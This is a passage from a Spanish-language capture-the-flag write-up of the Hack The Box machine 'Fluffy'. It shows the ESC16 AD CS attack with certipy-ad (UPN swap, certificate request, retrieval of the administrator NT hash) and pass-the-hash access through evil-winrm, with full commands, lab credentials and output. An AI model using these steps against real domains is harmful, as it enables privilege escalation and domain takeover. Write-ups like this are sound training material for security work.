+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u ca_svc@fluffy.htb -hashes <span style="color:#a5d6ff">&#39;:ca0f4f9e9eb8a092addf53bb03fc98c8&#39;</span> -dc-ip 10.129.232.88
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">33</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">11</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">14</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Retrieving CA configuration <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;fluffy-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Successfully retrieved CA configuration <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;fluffy-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Checking web enrollment <span style="color:#ff7b72">for</span> CA <span style="color:#a5d6ff">&#39;fluffy-DC01-CA&#39;</span> @ <span style="color:#a5d6ff">&#39;DC01.fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving text output to <span style="color:#a5d6ff">&#39;20261010002558_Certipy.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Wrote text output to <span style="color:#a5d6ff">&#39;20261010002558_Certipy.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving JSON output to <span style="color:#a5d6ff">&#39;20261010002558_Certipy.json&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Wrote JSON output to <span style="color:#a5d6ff">&#39;20261010002558_Certipy.json&#39;</span>
+</span></span></code></pre></div><p>Se confirma la presencia del servicio ADCS (Active Directory Certificate Services) dentro del dominio, lo que indica la existencia de una infraestructura de emisión de certificados.</p>
+<p>A partir de esto, se procede a enumerar las plantillas de certificados disponibles con el objetivo de identificar configuraciones inseguras o vulnerabilidades que puedan ser explotadas para escalar privilegios dentro del entorno.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u ca_svc@fluffy.htb -hashes <span style="color:#a5d6ff">&#39;:ca0f4f9e9eb8a092addf53bb03fc98c8&#39;</span> -dc-ip 10.129.232.88 -vulnerable -stdout
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#ff7b72;font-weight:bold">(</span>ly4k<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found <span style="color:#a5d6ff">33</span> certificate templates                                 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Enumeration output:                                            
+</span></span><span style="display:flex;"><span>Certificate Authorities                                            
+</span></span><span style="display:flex;"><span>  <span style="color:#a5d6ff">0</span>                                                                
+</span></span><span style="display:flex;"><span>    CA Name                             : fluffy-DC01-CA           
+</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.fluffy.htb          
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : <span style="color:#79c0ff">CN</span><span style="color:#ff7b72;font-weight:bold">=</span>fluffy-DC01-CA, <span style="color:#79c0ff">DC</span><span style="color:#ff7b72;font-weight:bold">=</span>fluffy, <span style="color:#79c0ff">DC</span><span style="color:#ff7b72;font-weight:bold">=</span>htb                                                         
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874                                                             
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 3024-04-17 16:12:16+00:00
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Vulnerabilities                                            
+</span></span><span style="display:flex;"><span>      ESC16                             : Security Extension is disabled.                                                              
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Remarks                                                    
+</span></span><span style="display:flex;"><span>      ESC16                             : Other prerequisites may be required <span style="color:#ff7b72">for</span> this to be exploitable. See the wiki <span style="color:#ff7b72">for</span> more details.                                                                                                                                      
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>Se identifica una condición compatible con <strong>ESC16</strong>, esta es una vulnerabilidad de configuración en Active Directory Certificate Services (AD CS) que se produce cuando la autoridad de certificación (CA) tiene deshabilitada la extensión de seguridad SID. Esto puede permitir ataques de suplantación de identidad mediante certificados, dependiendo de los permisos y de las políticas de autenticación del dominio.</p>
+<h2 id="explotación-de-esc16">
+  Explotación de ESC16
+  <a class="heading-link" href="#explotaci%c3%b3n-de-esc16">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Primero, modificamos temporalmente el <code>User Principal Name (UPN)</code> de la cuenta <code>ca_svc</code> para asignarle la identidad de <code>administrator</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username <span style="color:#a5d6ff">&#34;p.agila@fluffy.htb&#34;</span> -p <span style="color:#a5d6ff">&#34;prometheusx-303&#34;</span> -user ca_svc -upn <span style="color:#a5d6ff">&#39;administrator&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#ff7b72;font-weight:bold">(</span>ly4k<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Updating user <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>:
+</span></span><span style="display:flex;"><span>    userPrincipalName                   : administrator
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Successfully updated <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div><p>A continuación, solicitamos un certificado mediante AD CS, aprovechando la configuración vulnerable de ESC16, que permite emitirlo sin la extensión de seguridad SID.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.232.88 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad req -u <span style="color:#a5d6ff">&#39;ca_svc&#39;</span> -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip <span style="color:#a5d6ff">&#39;10.129.232.88&#39;</span> -ca <span style="color:#a5d6ff">&#39;fluffy-DC01-CA&#39;</span> -template <span style="color:#a5d6ff">&#39;User&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#ff7b72;font-weight:bold">(</span>ly4k<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Request ID is <span style="color:#a5d6ff">22</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Got certificate with UPN <span style="color:#a5d6ff">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#ff7b72">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving certificate and private key to <span style="color:#a5d6ff">&#39;administrator.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Wrote certificate and private key to <span style="color:#a5d6ff">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>Después, restauramos el UPN original de <code>ca_svc</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username <span style="color:#a5d6ff">&#34;p.agila@fluffy.htb&#34;</span> -p <span style="color:#a5d6ff">&#34;prometheusx-303&#34;</span> -user ca_svc -upn <span style="color:#a5d6ff">&#39;ca_svc@fluffy.htb&#39;</span>
+</span></span></code></pre></div><p>Utilizamos el certificado obtenido para autenticarnos como <code>administrator</code> y recuperar su hash NTLM.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.232.88 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad auth -pfx administrator.pfx -domain <span style="color:#a5d6ff">&#39;fluffy.htb&#39;</span> -dc-ip 10.129.232.88
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span>     SAN UPN: <span style="color:#a5d6ff">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Using principal: <span style="color:#a5d6ff">&#39;administrator@fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving credential cache to <span style="color:#a5d6ff">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Wrote credential cache to <span style="color:#a5d6ff">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Trying to retrieve NT hash <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Got hash <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;administrator@fluffy.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</span></span></code></pre></div><p>Finalmente, empleamos ese hash para conectarnos al sistema mediante <code>Evil-WinRM</code>, obteniendo acceso como administrador y recuperando la flag <code>root.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator<span style="color:#79c0ff">\D</span>ocuments&gt; cd ..
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator&gt; cd Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator<span style="color:#79c0ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>fba315e966551a3f4cd8209163cc2db7
+</span></span></code></pre></div><h1 id="conclusión">
+  Conclusión
+  <a class="heading-link" href="#conclusi%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>La explotación de Fluffy combina un vector de ataque a nivel de aplicación con abusos clásicos de Active Directory: la coerción NTLM mediante CVE-2025-24054 permite obtener credenciales de un segundo usuario a partir de un recurso SMB con permisos de escritura, el abuso de ACLs (<code>GenericAll</code> y <code>GenericWrite</code>) junto con Shadow Credentials permite comprometer cuentas de servicio, y finalmente la explotación de ESC16 en ADCS permite suplantar al Administrador del dominio. La combinación de estos vectores permite la toma completa del dominio desde un acceso inicial de bajo privilegio.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
